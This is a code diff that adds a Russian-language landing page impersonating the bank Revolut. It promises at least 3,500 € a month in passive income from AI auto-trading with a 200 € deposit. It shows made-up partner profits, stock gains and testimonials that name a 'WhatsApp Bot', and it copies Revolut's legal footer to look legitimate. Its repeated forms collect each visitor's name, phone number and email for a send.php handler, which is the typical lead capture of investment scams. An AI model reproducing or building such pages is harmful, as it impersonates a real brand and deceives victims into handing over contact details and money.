@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="google" content="notranslate">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<title>Revolut</title>
+
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+	<link rel="stylesheet" href="./src/css/style.css">
+
+</head>
+
+<body>
+	<div class="wrapper">
+
+
+		<header id="header" class="limit-size">
+			<img class="block-logo" src="./src/img/logo.png" alt="logo">
+			<div class="button-header">
+				<a href="#forms">Зарегистрироваться</a>
+			</div>
+		</header>
+
+
+		<main>
+			<section id="intro">
+				<div class="block-text">
+					<h1>Получайте от 3 500 € в месяц пассивного дохода благодаря платформе Revolut
+					</h1>
+				</div>
+				<div class="container-intro">
+					<div class="block-video" id="video">
+						<div class="videoPreview">
+							<img src="./src/img/play-button.png" alt="play-button" id="play-button">
+						</div>
+					</div>
+
+					<div class="block-form">
+						<h4>Подключайтесь и зарабатывайте</h4>
+						<h3>от 3 500 $ в первый месяц!</h3>
+
+						<form action="/send/send.php" method="POST" id="leadform1">
+
+							<input type="text" class="formInput" placeholder="Ваше Имя" id="fname" name="fname"
+								required />
+
+							<input type="text" class="formInput" placeholder="Ваша Фамилия" id="lname" name="lname"
+								required />
+
+							<input type="tel" placeholder="" class="formInput" id="phone" name="phone" required />
+
+							<input type="email" class="formInput" placeholder="Email" id="email" name="email"
+								required />
+
+							<button type="submit" class="formButton blue-button">
+								Зарегистрироваться
+							</button>
+						</form>
+					</div>
+				</div>
+			</section>
+
+
+			<section id="partnersResults" class="limit-size">
+				<h2>Результаты наших партнеров за вчера</h2>
+
+				<h6>Подробнее o продукте компании</h6>
+
+				<!-- Swiper -->
+				<div class="swiper mySwiper swiper-partnersResults">
+					<div class="swiper-wrapper">
+
+						<div class="swiper-slide">
+							<div class="slider-item">
+								<img class="img-item" src="./src/img/card-purple.png" alt="card-purple">
+								<div class="text-item">
+									<p class="text-big">Маржа: </p><span class="text-bold ">762 198 $</span>
+								</div>
+							</div>
+						</div>
+						<div class="swiper-slide">
+							<div class="slider-item">
+								<img class="img-item" src="./src/img/card-grey.png" alt="card-grey">
+								<div class="text-item">
+									<p class="text-big">Сумма вывода: </p><span class="text-bold ">419 984 $</span>
+								</div>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="slider-item">
+								<img class="img-item" src="./src/img/card-black.png" alt="card-black">
+								<div class="text-item">
+									<p class="text-big">Инвестировано: </p><span class="text-bold ">1 133 032 $</span>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<a href="#">
+					<button class="blue-button">Подробнее</button>
+				</a>
+			</section>
+
+
+			<section id="safety" class="limit-size">
+				<h2>БЕЗОПАСНОСТЬ НА 360°</h2>
+
+				<h6>Круглосуточно следим за безопасностью ваших денег</h6>
+
+				<div class="block-text">
+					<p class="text-big">
+						Благодаря нашей полной банковской лицензии ваши деньги защищены государственным учреждением.
+						Что вы получите при использовании инвестиционной платформы Revolut:
+					</p>
+
+					<h5>Низкий порог входа:</h5>
+					<p class="text-big">
+						Минимальная сумма доступная для инвестирования всего 200 евро, что делает платформу максимально
+						доступной
+					</p>
+
+					<h5>Полная автоматизация:</h5>
+					<p class="text-big">
+						Используйте полностью автоматизированные процессы с помощью искусственного интеллекта для
+						максимальной эффективности инвестирования, что делает платформу максимально простой.
+					</p>
+
+					<h5>Быстрый старт:</h5>
+					<p class="text-big">
+						Начните зарабатывать уже в течение первой недели и получайте выплаты на вашу карту без скрытых
+						комиссий и дополнительных сборов, что делает платформу максимально безопасной.
+					</p>
+				</div>
+
+			</section>
+
+
+			<section id="calculator" class="limit-size">
+				<h2>Вы можете рассчитать возможную прибыль благодаря калькулятору</h2>
+
+				<div class="container-blocks">
+					<p class="grey-item">Введите желаемый депозит, минимальная сумма: 200€</p>
+					<input class="deposit-input" type="number" min="200" placeholder="0.00€" />
+					<button class="calculate blue-button">Рассчитать</button>
+				</div>
+
+				<div class="result grey-item">
+					<p>Ваш заработок:</p>
+					<p class="sum-result">+0.00€</p>
+				</div>
+
+				<div class="table-block">
+					<table id="stock-table">
+						<tbody>
+							<tr class="table-row">
+								<th>AMAZON</th>
+								<th class="btc-quote">+50.66€</th>
+								<th class="btc-percent">+45.3%</th>
+							</tr>
+							<tr class="table-row">
+								<th>TESLA</th>
+								<th class="nke-quote">+16.43€</th>
+								<th class="nke-percent">+40.2%</th>
+							</tr>
+							<tr class="table-row">
+								<th>GOOGLE</th>
+								<th class="eth-quote">+9.48€</th>
+								<th class="eth-percent">+42.2%</th>
+							</tr>
+							<tr class="table-row">
+								<th>APPLE</th>
+								<th class="amcx-quote">+51.68€</th>
+								<th class="amcx-percent">+52.0%</th>
+							</tr>
+							<tr class="table-row">
+								<th>META</th>
+								<th class="snp500-quote">+11.97€</th>
+								<th class="snp500-percent">+38.9%</th>
+							</tr>
+							<tr class="table-row">
+								<th>NETFLIX</th>
+								<th class="snp500-quote">+11.97€</th>
+								<th class="snp500-percent">+38.9%</th>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</section>
+
+
+			<section id="companies">
+				<h2>Торгуй без усилий акциями международных компании</h2>
+
+				<h6>Всего от 200 €</h6>
+
+				<!-- Swiper -->
+				<div class="swiper mySwiper companiesSwiper">
+					<div class="swiper-wrapper">
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/meta.png" alt="Meta">
+								<h6>Meta</h6>
+								<p class="text-bold">519,83 USD</p>
+								<p class="under-text">+2,93 (0,57%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/amazon.png" alt="Amazon">
+								<h6>Amazon</h6>
+								<p class="text-bold">185,95 USD</p>
+								<p class="under-text">+0,28 (0,15%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/nvidia.png" alt="Nvidia">
+								<h6>Nvidia</h6>
+								<p class="text-bold">870,39 USD</p>
+								<p class="under-text">+16,85 (1,97%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/apple.png" alt="Apple">
+								<h6>Apple</h6>
+								<p class="text-bold">167,78 USD</p>
+								<p class="under-text red-text">−1,89 (1,11%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/tesla.png" alt="Tesla">
+								<h6>Tesla</h6>
+								<p class="text-bold">171,76 USD</p>
+								<p class="under-text red-text">−5,12 (2,89%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/google.png" alt="Google">
+								<h6>Google</h6>
+								<p class="text-bold">157,66 USD</p>
+								<p class="under-text red-text">−0,48 (0,30%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/netflix.png" alt="Netflix">
+								<h6>Netflix</h6>
+								<p class="text-bold">618,58 USD</p>
+								<p class="under-text">+0,38 (0,061%)сегодня</p>
+							</div>
+						</div>
+
+						<div class="swiper-slide">
+							<div class="swiper-item">
+								<img src="./src/img/icons/microsoft.png" alt="Microsoft">
+								<h6>Microsoft</h6>
+								<p class="text-bold">423,26 USD</p>
+								<p class="under-text red-text">−3,02 (0,71%)сегодня</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</section>
+
+
+			<section id="reviews">
+				<h2>Отзывы о проекте WhatsApp Bot</h2>
+
+				<h6>Что думают пользоватили</h6>
+
+				<div class="card-container">
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_TarasyukSergey.png" alt="TarasyukSergey" />
+							<div class="name">
+								<h5>Тарасюк Сергей</h5>
+								<p>04.01.2023</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Я долго искал надежный способ заработать деньги в интернете, и
+							наконец нашел автотрейдинг. Я просто настроил программу и оставил
+							все на ее усмотрение. Уже через неделю я увидел, что мой доход
+							увеличился. Я очень рад моему решению.
+						</p>
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_YarovoyLeonid.png" alt="YarovoyLeonid" />
+							<div class="name">
+								<h5>Яровой Леонид</h5>
+								<p>23.10.2022</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Начал торговать недавно, но уже заметил, что трейдинг дает более
+							высокий доход, чем банковские вклады. Рекомендую всем, кто хочет
+							зарабатывать деньги!
+						</p>
+
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_VishnyakovaYana.png" alt="VishnyakovaYana" />
+							<div class="name">
+								<h5>Вишнякова Яна</h5>
+								<p>15.01.2023</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Я начала торговать с WhatsApp Bot как хобби, но теперь это стало
+							основным источником дохода для меня.
+						</p>
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_TsvetkovaLarisa.png" alt="TsvetkovaLarisa" />
+							<div class="name">
+								<h5>Цветкова Лариса</h5>
+								<p>03.11.2022</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Я никогда не думала, что смогу зарабатывать деньги так легко!
+							Приложение позволяет мне контролировать свои финансы и получать
+							доход даже во время экономической нестабильности. Я и моя жена
+							благодарны компании WhatsApp Bot.
+						</p>
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_BykovPavel.png" alt="BykovPavel" />
+							<div class="name">
+								<h5>Быков Павел</h5>
+								<p>10.09.2022</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Я был немного скептически настроен к началу, но теперь я понимаю,
+							что трейдинг - это отличный способ заработать деньги себе на
+							жизнь, путишествия и развлечения.
+						</p>
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_KudryashovOleg.png" alt="KudryashovOleg" />
+							<div class="name">
+								<h5>Кудряшов Олег</h5>
+								<p>24.11.2022</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Немного волновался изначально, поэтому начинал с небольшой суммы.
+							Сейчас же у меня и у моей жены два активных счета и стабильный
+							заработок. Немного волновался изначально, поэтому начинал с
+							небольшой суммы.
+						</p>
+					</div>
+
+					<div class="item-block">
+						<div class="who-is">
+							<img src="./src/img/review_DementievRuslan.png" alt="DementievRuslan" />
+							<div class="name">
+								<h5>Дементьев Руслан</h5>
+								<p>30.12.2022</p>
+							</div>
+						</div>
+						<p class="text-p">
+							Я начал использовать автотрейдинг программу примерно месяц назад и
+							доволен результатами. Мои инвестиции неожиданно начали приносить
+							прибыль, и я не могу поверить, что все это происходит
+							автоматически.
+						</p>
+					</div>
+				</div>
+			</section>
+
+
+			<section id="forms">
+				<div class="block-form">
+					<h4>Подключайтесь и зарабатывайте</h4>
+					<h3>от 3 500 $ в первый месяц!</h3>
+
+					<form action="/send/send.php" method="POST" id="leadform1">
+
+						<input type="text" class="formInput" placeholder="Ваше Имя" id="fname" name="fname" required />
+
+						<input type="text" class="formInput" placeholder="Ваша Фамилия" id="lname" name="lname"
+							required />
+
+						<input type="tel" placeholder="" class="formInput" id="phone" name="phone" required />
+
+						<input type="email" class="formInput" placeholder="Email" id="email" name="email" required />
+
+						<button type="submit" class="formButton blue-button">
+							Зарегистрироваться
+						</button>
+					</form>
+				</div>
+			</section>
+		</main>
+
+
+		<footer id="footer">
+			<div class="logo-block">
+				<img src="./src/img/logo.png" alt="logo">
+			</div>
+
+			<div class="social-block">
+				<a href="#footer"><img src="./src/img/icons/social-media/facebook.png" alt="facebook"></a>
+				<a href="#footer"><img src="./src/img/icons/social-media/instagram.png" alt="instagram"></a>
+				<a href="#footer"><img src="./src/img/icons/social-media/twitter.png" alt="twitter"></a>
+				<a href="#footer"><img src="./src/img/icons/social-media/linkedin.png" alt="linkedin"></a>
+				<a href="#footer"><img src="./src/img/icons/social-media/tikTok.png" alt="tikTok"></a>
+			</div>
+
+			<div class="container-footer">
+
+				<div class="nav-block">
+					<ul>
+						<li>
+							<a class="link-item" href="#">Условия использования веб-сайта</a>
+						</li>
+						<li>
+							<a class="link-item" href="#">Претензии</a>
+						</li>
+						<li>
+							<a class="link-item" href="#">Юридические соглашения</a>
+						</li>
+						<li>
+							<a class="link-item" href="#">Уязвимость клиентов</a>
+						</li>
+						<li>
+							<a class="link-item" href="#">Конфиденциальность</a>
+						</li>
+						<li>
+							<a class="link-item" href="#">Декларация о конфиденциальности данных соискателей</a>
+						</li>
+					</ul>
+				</div>
+
+				<div class="text-block">
+					<p class="text-start">
+						© 2024 Revolut Bank UAB
+					</p>
+					<p>
+						Чтобы узнать о том, какое подразделение Revolut предоставляет вам услуги, нажмите здесь. Если у
+						вас
+						возникли другие вопросы, свяжитесь с нами в чате приложения Revolut.
+						Revolut Bank UAB — банк, зарегистрированный в Литовской Республике. Юридический адрес:
+						Konstitucijos
+						ave. 21B, Vilnius, 08130, the Republic of Lithuania (Литовская Республика) (рег. №: 304580906,
+						код
+						финансового учреждения: 70700). Revolut Bank UAB имеет лицензию Европейского центрального банка
+						и
+						регулируется Банком Литвы. Revolut Bank UAB предоставляет услуги по кредитованию, осуществлению
+						платежей
+						и открытию текущих и депозитных счетов до востребования.
+						Страховые услуги предоставляются подразделением Revolut Insurance Europe UAB, уполномоченным
+						Банком
+						Литвы выступать в качестве страхового посредника. Юридический адрес: Konstitucijos ave. 21B,
+						Vilnius,
+						08130, the Republic of Lithuania (Литовская Республика) (рег. №: 305910164).
+						Компания Revolut Ltd (№ 08804411) уполномочена Управлением по финансовому регулированию и
+						контролю
+						(Financial Conduct Authority, FCA) в соответствии с требованиями Electronic Money Regulations
+						2011
+						(Положение об электронных деньгах 2011 г.) и зарегистрирована под номером 900562. Юридический
+						адрес:
+						7
+						Westferry Circus, Canary Wharf, London, England, E14 4HD, United Kingdom (Великобритания).
+						Услуги страхования для клиентов Revolut Ltd предоставляет компания Revolut Travel Ltd,
+						уполномоченная
+						Управлением по финансовому регулированию и контролю (FCA) выступать в качестве страхового
+						посредника
+						(номер FCA: 780586) и Revolut Ltd, назначенным представителем Revolut Travel Ltd в отношении
+						страхового
+						посредничества. Инвестиционные услуги в Европейской экономической зоне (ЕЭЗ) предоставляет
+						Revolut
+						Securities Europe UAB (рег. № 305799582). Юридический адрес: Konstitucijos ave. 21B, Vilnius,
+						Lithuania,
+						LT-08130 (Литва). Компания Revolut Securities Europe UAB уполномочена Банком Литвы в качестве
+						брокерской
+						фирмы.
+					</p>
+
+					<p class="text-end">
+						Денежные переводы: Переводы в Украину | Переводы в Таиланд | Переводы в Канаду | Переводы в
+						Австралию |
+						Переводы в Великобританию | Переводы в Индию | Переводы в США | Переводы в Эстонию из США
+					</p>
+				</div>
+			</div>
+		</footer>
+	</div>
+
+
+	<!-- Swiper JS -->
+	<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+
+	<script src="./src/js/jquery-3.7.1.min.js"></script>
+	<script src="./src/js/script.js"></script>
+</body>
+
+</html>
